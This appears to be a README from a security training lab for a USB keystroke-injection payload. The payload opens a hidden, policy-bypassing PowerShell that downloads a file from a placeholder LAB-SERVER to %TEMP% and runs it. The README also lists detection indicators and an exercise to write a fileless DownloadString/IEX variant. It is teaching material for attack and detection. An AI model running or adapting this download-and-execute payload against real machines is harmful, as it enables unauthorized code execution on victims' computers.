# Lab 02 — Staged Download-and-Execute

**Payload:** [payload.txt](payload.txt)
**Target:** Windows 10/11, local (non-domain) machine, no elevation required
**ATT&CK techniques:** T1059.001 (PowerShell), T1105 (Ingress Tool Transfer),
T1204.002 (User Execution: Malicious File)

## Change from the submitted version

The original script pointed at `http://example.com/calc.txt`. It's been
changed to `http://LAB-SERVER/calc.txt` as a placeholder — **replace
`LAB-SERVER` with an address on your isolated lab network** (a small
Python `http.server` or IIS instance serving an innocuous renamed binary,
e.g. an actual `calc.exe` copy, works well). Reasons not to point this at
a real internet host during a live classroom run:

- It sends real DNS/HTTP traffic off the isolated network, which defeats
  the point of running in a contained lab.
- If the VM does have any bridged/NAT internet access left on by mistake,
  a real download will happen — better to fail closed against an address
  that only resolves inside the lab.
- It avoids generating telemetry against a real third-party domain from a
  classroom's IP space.

## What it does, line by line

```
DELAY 1000        Wait 1s for the OS to recognize the HID device.
GUI r              Open the Run dialog.
DELAY 200
STRING powershell -NoP -NonI -W Hidden -Exec Bypass "..."
                   -NoP          : no PowerShell profile loaded (faster, quieter)
                   -NonI         : non-interactive
                   -W Hidden     : hidden window (no visible console this time,
                                   unlike Lab 01)
                   -Exec Bypass  : ignore the execution policy for this process

                   IEX (New-Object System.Net.WebClient).DownloadFile(
                       'http://LAB-SERVER/calc.txt', "$env:temp\calc.exe")
                   Start-Process "$env:temp\calc.exe"
ENTER              Submits the Run dialog. No UAC step - this payload
                   deliberately stays unelevated.
```

Net effect: downloads a file from the lab server to `%TEMP%\calc.exe` and
runs it, entirely without administrator rights.

## Spot the bug (discussion exercise)

Look closely at the PowerShell before running it: **`IEX` is dead code
here.** `IEX` (`Invoke-Expression`) expects a string of PowerShell code to
run. `DownloadFile()` doesn't return a string — it downloads straight to
disk and returns nothing (`$null`). So `IEX $null` does nothing useful
(and in some PowerShell versions throws a non-fatal error that's easy to
miss in a hidden window). The payload only works because of the separate
`Start-Process` call after the semicolon.

This is a common copy-paste artifact: someone merged the classic
"fileless" pattern —
`IEX (New-Object Net.WebClient).DownloadString('http://.../script.ps1')`
(download a script's *text* and execute it in-memory, no file touches
disk) — with the "download-to-disk-then-run" pattern, and kept the `IEX`
from the first one by mistake. Ask students to:

1. Identify why `IEX` is superfluous here.
2. Rewrite it as a correct fileless variant using `DownloadString` + `IEX`
   (no file ever written to `%TEMP%`).
3. Discuss detection implications: the fileless variant leaves no file on
   disk for Sysmon Event ID 11 / AV file-scan to catch, only the network
   call and the PowerShell process itself — a good segue into why EDR
   increasingly focuses on PowerShell script-block logging (event 4104)
   and AMSI over file-based detection.

## Blue-team exercise

Run [detect.ps1](detect.ps1) on the victim VM after the payload executes.
It checks for:

- Recently created files in `%TEMP%` for all local users
- Sysmon Event ID 3 (network connection) from `powershell.exe`
- Sysmon Event ID 11 (file create) under `Temp` paths
- Sysmon Event ID 1 / Security 4688 process creation showing a process
  spawned from `%TEMP%`
- PowerShell script block log (event 4104) containing `WebClient`,
  `DownloadFile`, `DownloadString`, or `IEX`

## Cleanup

See [cleanup.ps1](cleanup.ps1) — this one's fully reversible (unlike
Lab 01's ACL changes), but a snapshot revert is still the cleanest reset
between runs.
